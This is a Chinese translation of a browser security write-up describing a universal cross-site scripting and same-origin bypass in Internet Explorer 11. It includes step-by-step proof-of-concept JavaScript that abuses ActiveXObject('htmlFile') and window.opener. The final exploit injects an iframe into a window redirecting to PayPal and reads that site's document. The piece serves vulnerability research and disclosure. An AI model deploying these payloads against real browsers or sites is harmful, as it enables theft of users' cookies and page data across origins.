> 原文链接: https://www.anquanke.com//post/id/85428 


# 【技术分享】IE11 上的SOP bypass/UXSS


                                阅读量   
                                **114667**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：brokenbrowser.com
                                <br>原文地址：[http://www.brokenbrowser.com/uxss-ie-htmlfile/](http://www.brokenbrowser.com/uxss-ie-htmlfile/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01195891e96593592d.png)](https://p5.ssl.qhimg.com/t01195891e96593592d.png)

****

翻译：[胖胖秦](http://bobao.360.cn/member/contribute?uid=353915284)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**前言**



今天，我们将要探索Internet Explorer问世以来一直存在的功能。这个功能允许Web开发人员实例化外部对象，并且一直被攻击者滥用。你猜的到我们在说什么功能吗？这个功能就是ActiveXObject。

即使这些天受到限制，我们不能再愉快地呈现Excel电子表格，但仍然有很多事情可以做。我们将绕过UXSS / SOP，允许我们访问任何域的文档，当然也包括cookie和每个可想象的东西。

但是不要认为ActiveXObject只是另一个UXSS。它是攻击者可以使用的完美元素，因为它有无数的漏洞，我们将在以下帖子中看到。我全心全意地建议你探索这个对象。

**<br>**

**不同的容器来渲染HTML**



在浏览器中渲染HTML有几种方法，我想到的第一个就是IFRAME标签，但是我们也可以使用OBJECT或者EMBED标签。

事实上，有一些对象允许我们在逻辑上渲染HTML，但是并不可见。例如：[implementation.createDocument](https://developer.mozilla.org/en-US/docs/Web/API/DOMImplementation/createDocument)，[implementation.createHTMLDocument](https://developer.mozilla.org/en-US/docs/Web/API/DOMImplementation/createHTMLDocument)甚至XMLHttpRequest都可以返回文档对象而不是text/ xml。

这些HTML文档与iframe / windows中的HTML文档有很多相似之处，但并不包括所有内容。例如，其中一些不能执行脚本，另一些没有任何关联的窗口，所以他们没有像window.open等方法。换句话说，这些文档有它们的限制。

但Internet Explorer有几种其他的方式来呈现HTML，我最喜欢的一个在ActiveXObject的帮助下实例化一个“htmlFile”。这种类型的文档也有限制，但至少它能够运行脚本。看看下面的代码。

```
Doc = new ActiveXObject("htmlFile");
```

这个ActiveXObject创建一个类似于[WebBrowser控件](https://msdn.microsoft.com/en-us/library/aa752041(v=vs.85).aspx)（基本上像一个iframe），并返回到它的文档对象的引用。要访问窗口对象，我们将使用原始的parentWindow或Script，因为这里不支持defaultView。



```
win = doc.defaultView;  // Not supported.
win = doc.Script;       // Returns the window object of doc.
win = doc.parentWindow; // Returns the window object of doc.
```

我是“Script”的粉丝，所以我使用它。顺便说一句，我很好奇，这个ActiveXObject的位置是什么？

[![](https://p2.ssl.qhimg.com/t0171e47341af8c3789.png)](http://www.brokenbrowser.com/wp-content/uploads/2017/02/01-location.png)

很有趣！对我来说下一个问题是：这个文档的窗口对象是否与我们正在处理的一样？我的意思是，它有一个真正的窗口或是与它的父对象/创建者共享？



```
// Remember:
// win is the window object of the ActiveXObject.
// window is the window object of the main window.
alert(win == window);  // false
```

因此我们得出的结论是ActiveXObject窗口不同于主窗口，这意味着它有自己的窗口。我想知道现在谁是它的顶部。ActiveXObject认为谁是它的顶部？

[![](https://p1.ssl.qhimg.com/t0195b090a6d1d8d115.png)](https://p1.ssl.qhimg.com/t0195b090a6d1d8d115.png)

哇！win认为它是顶级的，这让我很迷惑，这可以绕过XFO和执行不安全的请求（no SSLin top SSL）。写下这些想法！至少这是我的工作方式：当有趣的东西来到我的脑海里，我立即注意到，所以我可以保持关注原始目标，而不让这些想法消失在灰色的海洋。 

反正，我很好奇的另一件事是这个文档的域。它是什么？



```
alert(doc.domain); // The same domain as the top page
```

它返回与主窗口相同的域，这没有什么大不了，但它值得更多的测试。



**<br>**

**检索顶部的document.domain**



在这一点上，我的第一个问题是：如果我们改变主页的基本href，然后实例化这个ActiveX会发生什么？它将具有页面的相同域还是来自基本href的域？

这个想法不起作用，但是在创建对象时不要低估基本href，因为它在过去创造过奇迹，它可能会在以后用到。看看我们怎么在最近[绕过SOP](https://www.brokenbrowser.com/workers-sop-bypass-importscripts-and-basehref/).。

无论如何，我尝试另一个选择：从不同的域中的iframe中创建ActiveXObject。换句话说，相同的代码，但现在从不同的域iframe执行。



```
&lt;!-- Main page in https://www.cracking.com.ar renders the iframe below --&gt;
&lt;iframe src="https://www.brokenbrowser.com/demos/sop-ax-htmlfile/retrievetopdomain.html"&gt;&lt;/iframe&gt;
 
&lt;!-- iFrame code on a different domain --&gt;
&lt;script&gt;
doc = new ActiveXObject("htmlFile");
alert(doc.domain);  // Bang! Same as top!!
&lt;/script&gt;
```

令我惊讶的是，ActiveXObject由顶级域创建，而不是IFRAME。

[![](https://p2.ssl.qhimg.com/t019a02b301147fdc6b.png)](https://p2.ssl.qhimg.com/t019a02b301147fdc6b.png)

**[ 概念IE11证明 ]**



当然，检索主页的域不是一个完整的SOP绕过，但它是坚实的证据，我们正在处理一个困惑的浏览器。使用JavaScript，激情和坚持，我们会做到的。

<br>

**传递引用到顶部**



我们现在的目标是与ActiveXObject共享顶层窗口的引用，以查看它是否有权访问。如果它的document.domain与顶部相同，它应该能够访问！但还有另一个挑战：从浏览器的角度来看，这个ActiveXObject没有完全初始化。这意味着我们不能创建变量或更改任何成员的值。想象一下，一个冻结的对象，你不能添加/删除/改变任何东西。



```
doc = new ActiveXObject("htmlFile");
win = doc.Script;
win.myTop = top;      // Browser not initialized, variable is not set
win.execScript("alert(win.myTop)"); // undefined
```

在常规窗口中它应该可以工作，除非我们使用document.open初始化,否则它不和这个ActiveXObject一起工作，。问题是，如果我们初始化对象，然后IE将设置正确的域,这将摧毁我们的把戏。检查这一点，看看我的意思。



```
doc = new ActiveXObject("htmlFile");
alert(doc.domain);   // alerts the top domain (SOP bypass)
doc.open();          // Initialize the document
alert(doc.domain);   // alerts the iFrame domain (No more SOP bypass)
```

那么我们如何将顶层窗口对象传递给ActiveXObject呢？在每个窗口中都有一个非常特别的地方，在其他任何地方都是可读写的。它是什么？opener！是的，window.opener是我们的朋友，所以让我们试试！



```
doc = new ActiveXObject("htmlFile");
win = doc.Script;
win.opener = top;
win.execScript("alert(opener.document.URL)");  // Full SOP bypass
```

[![](https://p1.ssl.qhimg.com/t0137f30011aa61169d.png)](https://p1.ssl.qhimg.com/t0137f30011aa61169d.png)

**[IE11概念证明 ]**



是! Opener正常工作。现在，不用考虑我们的域，我们都可以访问顶级文档。我们的iframe可以在另一个IFRAME内部或深度嵌套在不同的域的内部框架中，但是它一直能够访问顶部。 

所以，我们有一个正常工作的UXSS，但它仍然有一个问题：它需要加载到一个iframe内，我不认为任何有针对性的网站会如此慷慨的在他们的iframe中渲染我们的iframe，对吧？但想想现在运行的所有横幅广告：它们在iframe中呈现，并且他们可以访问顶部！这意味着Facebook广告，Yahoo!广告和在iframe中运行的任何不受信任的内容都可以访问主页面。如果我们在Facebook广告,就可以发布内容，访问我们的联系人和Cookie,没有任何限制。

我们应该进一步找到一种方法来获得网站的cookie。我们如何在任意非合作网站上做到这一点呢？我们可以在没有iframe的网站上运行吗？许多解决方案在我的心中，但第一和最简单的就是：[重定向] + [线程块] + [注入]。该技术是超级容易。

<br>

**注入内容无处不在**



有一种方式可以在任何WINDOW/ IFRAME注入HTML /SCRIPT，而不用考虑它的域,在它有机会加载之前。例如，假设我们打开一个带有服务器重定向到Paypal的新窗口。在重定向发生之前，我们仍然可以访问窗口，但一旦重定向加载新的URL，我们将无法再访问了，对吗？事实上，当重定向发生时，IE在渲染新内容之前破坏窗口中的每个元素。

但是，如果我们在页面中注入一个元素，在重定向之前会发生什么？更多的是，如果注入后,我们阻塞线程,而不给IE机去破坏对象，但是让重定向执行,这又会发生什么呢？新的网页将保留旧的（注入）内容，因为IE无法删除它。

在这种情况下，我们将使用alert阻塞线程，但是还有其他方法来实现同样的事情。让我们回顾一下在编码之前我们需要做什么：

1. 打开一个重定向到Paypal的新窗口。

2. 在重定向发生之前，注入一个iframe。

3. 重定向发生后，从iframe中创建ActiveXObject。

4. 砰!就是这样。现在ActiveXObject具有与主窗口相同的域。

这里是工作代码。



```
w = window.open("redir.php?URL=https://www.paypal.com");
 
 // Create and inject an iframe in the target window
 ifr = w.document.createElement('iframe');
 w.document.appendChild(ifr);
 // Initialize the iframe
 w[0].document.open();
 w[0].document.close();
 // Pass a reference to the top window
 // So the iframe can access even after the redirect.
 w[0]._top = w;
 // Finally, once Paypal is loaded (or loading, same thing) we create the
 // ActiveXObject within the injected iframe.
 w[0].setTimeout('alert("[ Thread Blocked to prevent iFrame destruction ]\n\nClose this alert once the address bar changes to the target site.");' +
                             'doc = new ActiveXObject("htmlFile");' +
                             'doc.Script.opener = _top;' +
                             'doc.Script.setTimeout("opener.location = 'javascript:alert(document.all[0].outerHTML)'");');
```

**[ 概念IE11证明 ]**

[![](https://p0.ssl.qhimg.com/t01efc53403512ce673.png)](https://p0.ssl.qhimg.com/t01efc53403512ce673.png)

不要停在这里。继续使用ActiveXObject，因为它充满了等待被发现的东西。你能让这个PoC更加简洁，使用更少的代码吗？你能建立一个线程阻塞而没有警报吗？祝你好运！



<br style="text-align: left">
